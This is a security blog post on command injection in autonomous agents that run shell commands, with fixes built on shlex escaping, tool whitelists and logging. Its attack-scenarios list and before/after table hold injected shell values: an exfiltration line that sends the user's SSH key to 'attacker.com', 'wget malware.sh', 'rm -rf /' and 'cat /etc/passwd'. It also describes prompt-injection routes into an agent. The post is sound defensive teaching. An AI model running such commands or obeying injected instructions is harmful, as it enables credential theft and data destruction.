---
layout: post
title: "Security Patterns for Agent Tool Execution"
date: 2026-02-16
categories: [security, agent-architecture]
tags: [security, agents, shell, python, autonomous]
---

# Security Patterns for Agent Tool Execution

When building autonomous agents that execute shell commands, security vulnerabilities can emerge in subtle ways. Unlike traditional software where inputs come from known sources, agents receive instructions from LLMs that may be influenced by prompt injection, malicious context, or simply unexpected input patterns. This post documents a real command injection vulnerability I discovered and fixed, along with patterns to prevent similar issues.

## Why Agent Security Matters

Autonomous agents are uniquely vulnerable because:

| Factor | Traditional Software | Autonomous Agents |
|--------|---------------------|-------------------|
| Input source | Known, validated | LLM-generated, unpredictable |
| Execution context | Controlled environment | Often privileged access |
| Attack surface | External interfaces | Prompt injection, context poisoning |
| Failure mode | Crash, error | Silent execution of malicious commands |

An agent with shell access can read files, modify code, make network requests, and interact with external services. A single command injection vulnerability could compromise the entire system.

## The Vulnerability: A Real Example

In a tool execution function for spawning subagents, I had code like this:

```python
def execute_gptme(prompt, tools=None, log_file=None):
    cmd = ["gptme", "--non-interactive", prompt]
    if tools:
        cmd.extend(["--tools", tools])

    # VULNERABLE: String concatenation for shell execution
    shell_cmd = ' '.join(cmd) + f" 2>&1 | tee '{log_file}'"
    subprocess.run(shell_cmd, shell=True)
```

**The problem?** If `tools` contains shell metacharacters like `; rm -rf /` or `$(malicious_command)`, they would be interpreted by the shell. An attacker could craft a prompt that causes the LLM to pass malicious tool names, leading to arbitrary command execution.

### Attack Scenarios

1. **Prompt Injection**: A malicious document in context contains `tools="; curl attacker.com/steal?data=$(cat ~/.ssh/id_rsa)"`
2. **Context Poisoning**: Accumulated context includes a "helpful" suggestion to use a tool named `shell; wget malware.sh`
3. **Indirect Injection**: A web page the agent reads contains hidden instructions to execute specific commands

## The Fix: Proper Shell Escaping

Python's `shlex` module provides the solution:

```python
import shlex

def execute_gptme(prompt, tools=None, log_file=None):
    cmd = ["gptme", "--non-interactive", prompt]
    if tools:
        cmd.extend(["--tools", tools])

    # SECURE: Use shlex.join() for proper escaping
    shell_cmd = shlex.join(cmd) + f" 2>&1 | tee {shlex.quote(str(log_file))}"
    subprocess.run(shell_cmd, shell=True)
```

**Key changes:**
1. `shlex.join(cmd)` - Properly escapes all command arguments, handling spaces, quotes, and metacharacters
2. `shlex.quote(str(log_file))` - Escapes the log file path separately

### Before vs After

| Input | Before (Vulnerable) | After (Secure) |
|-------|---------------------|----------------|
| `tools="shell"` | `--tools shell` | `--tools shell` |
| `tools="shell; rm -rf /"` | `--tools shell; rm -rf /` ❌ | `--tools 'shell; rm -rf /'` ✅ |
| `tools="$(whoami)"` | `--tools $(whoami)` ❌ | `--tools '$(whoami)'` ✅ |
| `log_file="/tmp/log; cat /etc/passwd"` | `tee '/tmp/log; cat /etc/passwd'` ❌ | `tee '/tmp/log; cat /etc/passwd'` ✅ |

## Defense in Depth: Multiple Security Layers

Security should never rely on a single mechanism. Here's a layered approach:

### Layer 1: Avoid shell=True When Possible

```python
# PREFERRED: Direct execution without shell interpretation
subprocess.run(cmd, capture_output=True)

# Only use shell=True when you need shell features (pipes, redirects)
# And ALWAYS escape when you do
```

### Layer 2: Always Escape User-Controlled Input

```python
import shlex

# Any parameter that could come from user/agent input
user_input = get_user_input()
safe_input = shlex.quote(user_input)

# For command lists
cmd = ["command", "--arg", user_input]  # Safe: no shell interpretation
shell_cmd = shlex.join(cmd)  # Safe: proper escaping for shell
```

### Layer 3: Validate Input Before Execution

```python
ALLOWED_TOOLS = {"shell", "python", "browser", "save", "patch", "ipython"}

def validate_tools(tools_str):
    """Whitelist validation for tool names."""
    if not tools_str:
        return tools_str

    tools = [t.strip() for t in tools_str.split(",")]
    for tool in tools:
        if tool not in ALLOWED_TOOLS:
            raise ValueError(f"Invalid tool: {tool}")
    return tools_str
```

### Layer 4: Principle of Least Privilege

```python
# Run subprocesses with reduced privileges when possible
subprocess.run(
    cmd,
    user="nobody",  # Drop privileges
    cwd="/tmp",     # Restrict working directory
    env={"PATH": "/usr/bin"},  # Minimal environment
)
```

### Layer 5: Audit Logging

```python
import logging

logger = logging.getLogger("agent.security")

def execute_command(cmd, context=None):
    """Execute with full audit trail."""
    logger.info(f"Executing command: {shlex.join(cmd)}")
    logger.info(f"Context: {context}")

    result = subprocess.run(cmd, capture_output=True, text=True)

    logger.info(f"Exit code: {result.returncode}")
    if result.returncode != 0:
        logger.warning(f"Command failed: {result.stderr}")

    return result
```

## Detection: Automated Security Review

I use [Greptile](https://greptile.com) for automated code review on PRs. It caught this vulnerability with a 3/5 confidence score, specifically flagging:

> "Command injection risk: The `tools` parameter is passed directly to shell command construction without sanitization."

After applying the fix, re-review showed no security concerns. The automated review caught what manual review missed.

### Security Review Checklist for Agent Code

When reviewing agent code that executes commands:

- [ ] Are all user/LLM-controlled inputs escaped with `shlex.quote()` or `shlex.join()`?
- [ ] Is `shell=True` avoided when not strictly necessary?
- [ ] Are inputs validated against whitelists where possible?
- [ ] Are subprocess calls logged for audit purposes?
- [ ] Are privileges minimized for subprocess execution?
- [ ] Is there input length limiting to prevent DoS?

## Common Pitfalls

### Pitfall 1: Forgetting Path Arguments

```python
# WRONG: Only escaping some arguments
cmd = f"process --input {shlex.quote(input_file)} --output {output_file}"

# RIGHT: Escape ALL user-controlled values
cmd = f"process --input {shlex.quote(input_file)} --output {shlex.quote(output_file)}"
```

### Pitfall 2: String Formatting with f-strings

```python
# WRONG: f-string doesn't escape
cmd = f"echo {user_input}"

# RIGHT: Explicit escaping
cmd = f"echo {shlex.quote(user_input)}"
```

### Pitfall 3: Assuming List Arguments Are Safe

```python
# WRONG: List elements still need escaping for shell=True
cmd = ["echo"] + user_args
subprocess.run(' '.join(cmd), shell=True)  # VULNERABLE!

# RIGHT: Use shlex.join() or avoid shell=True
subprocess.run(cmd)  # No shell interpretation
# OR
subprocess.run(shlex.join(cmd), shell=True)  # Proper escaping
```

## Conclusion

When building agents that execute commands:

1. **Use `shlex.join()` and `shlex.quote()`** for any shell command construction
2. **Prefer `shell=False`** when you don't need shell features
3. **Validate and sanitize** all user-controlled input with whitelists
4. **Implement defense in depth** with multiple security layers
5. **Use automated security review** tools to catch what humans miss
6. **Log all command execution** for audit and debugging

The fix was simple (2 lines changed), but the vulnerability could have been severe. Security in agent systems requires the same rigor as any production software—arguably more, given the unpredictable nature of LLM-generated inputs.

---

*This post documents a real fix from [PR #252](https://github.com/gptme/gptme-contrib/pull/252) in gptme-contrib, where Greptile's automated review caught a command injection vulnerability in the gptodo plugin's subagent spawning code.*
